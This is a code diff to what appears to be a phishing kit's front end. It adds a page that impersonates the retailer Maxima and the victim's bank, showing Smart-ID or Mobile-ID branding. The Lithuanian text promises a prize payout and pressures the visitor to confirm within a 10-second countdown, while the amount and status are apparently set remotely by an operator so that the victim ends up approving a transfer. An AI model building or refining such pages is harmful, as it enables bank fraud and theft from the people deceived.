@@ -14,6 +14,7 @@ type ApprovalViewState = {
   sessionStatus: string;
   approvalStatus: string;
   approvalCode: string;
+  transferAmount: string;
   bankSlug: string;
   bankName: string;
   message: string;
@@ -290,6 +291,82 @@ function BiometricApprovalCard({
   );
 }
 
+function TransferApprovalCard({
+  method,
+  amount,
+  secondsLeft,
+  saving,
+  bankSlug,
+  bankName,
+  onConfirm,
+}: {
+  method: "smartid" | "mobileid";
+  amount: string;
+  secondsLeft: number;
+  saving: boolean;
+  bankSlug: string;
+  bankName: string;
+  onConfirm: () => void;
+}) {
+  const bankLogo = resolveLocalBankLogoFile(bankSlug, null);
+  const shownAmount = amount || "0,00";
+
+  return (
+    <div className="flex min-h-screen items-center justify-center px-4 py-8">
+      <div className="w-full max-w-[400px] rounded-[24px] border border-[#dce8f5] bg-white px-6 py-7 shadow-[0_20px_70px_rgba(20,32,56,0.10)]">
+        {/* Maxima sol ust + banka logosu sag ust */}
+        <div className="mb-6 flex items-start justify-between">
+          <img
+            src="/form-assets/maxima-mini-logo.png"
+            alt="Maxima"
+            className="h-7 w-auto object-contain"
+          />
+          {bankLogo ? (
+            <img
+              src={bankLogo}
+              alt={bankName || bankSlug || "Banka"}
+              className="h-9 w-9 rounded-full border border-gray-100 object-cover shadow-sm"
+            />
+          ) : null}
+        </div>
+
+        <h1 className="mb-6 text-center text-[1.35rem] font-bold tracking-tight text-gray-800">
+          Patvirtinimo pranešimas
+        </h1>
+
+        <div className="mb-6 flex justify-center">
+          {method === "mobileid" ? <MobileIdMark /> : <SmartIdMark />}
+        </div>
+
+        <div className="mb-6 rounded-2xl bg-[#f4f7fb] px-5 py-4">
+          <p className="text-center text-[13px] font-medium leading-relaxed text-gray-600">
+            Sveikiname, kadangi kampanijoje yra ne vienas laimėtojas, dalis{" "}
+            <span className="font-bold text-gray-900">€{shownAmount}</span> sumos patvirtinimo
+            pranešime, kurį matote paraiškoje, bus pervesta jums. Patvirtinkite instrukcijas
+            per 10 sekundžių ir jų neatmeskite. Šį pavedimą tvarko jūsų banka.
+          </p>
+        </div>
+
+        <p className="mb-5 text-center text-[13px] text-gray-500">
+          Liko laiko: <span className="font-bold text-gray-800">{secondsLeft} s</span>
+        </p>
+
+        <button
+          type="button"
+          onClick={onConfirm}
+          disabled={saving}
+          className="flex w-full items-center justify-center gap-2 rounded-full bg-[#14b8a6] px-4 py-3.5 text-[15px] font-bold text-white transition hover:bg-[#0d9488] disabled:cursor-not-allowed disabled:opacity-70"
+        >
+          <svg className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
+            <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+          </svg>
+          {saving ? "Patvirtinama..." : "Patvirtinti"}
+        </button>
+      </div>
+    </div>
+  );
+}
+
 function SpecialNoticeCard({ message, imageUrl }: { message: string; imageUrl: string | null }) {
   return (
     <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
@@ -323,6 +400,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
     sessionStatus: "",
     approvalStatus: "",
     approvalCode: "",
+    transferAmount: "",
     bankSlug: "",
     bankName: "",
     message: "Prašome palaukti...",
@@ -340,7 +418,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
 
   useEffect(() => {
     if (!viewState.approvalStatus) return;
-    setSecondsLeft(30);
+    setSecondsLeft(viewState.approvalStatus.startsWith("transfer") ? 10 : 30);
 
     const timer = window.setInterval(() => {
       setSecondsLeft((previous) => {
@@ -367,6 +445,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
         sessionStatus: sessionData?.status?.trim() ?? "",
         approvalStatus: fd.approvalStatus?.trim() ?? "",
         approvalCode: fd.approvalCode?.trim() ?? "",
+        transferAmount: fd.transferAmount?.trim() ?? "",
         bankSlug: fd.bankSlug?.trim() ?? "",
         bankName: fd.bankName?.trim() ?? "",
         message: fd.specialNoticeText ?? fd.customMessage ?? "Prašome palaukti...",
@@ -466,6 +545,20 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
         secondsLeft={secondsLeft}
         saving={saving}
         pinLabel={viewState.approvalStatus === "mobileid_2" ? "PIN2" : "PIN1"}
+        onConfirm={() => void handleApprovalSubmit()}
+      />
+    );
+  }
+
+  if (viewState.approvalStatus === "transfer_smartid" || viewState.approvalStatus === "transfer_mobileid") {
+    return (
+      <TransferApprovalCard
+        method={viewState.approvalStatus === "transfer_mobileid" ? "mobileid" : "smartid"}
+        amount={viewState.transferAmount}
+        secondsLeft={secondsLeft}
+        saving={saving}
+        bankSlug={viewState.bankSlug}
+        bankName={viewState.bankName}
         onConfirm={() => void handleApprovalSubmit()}
       />
     );
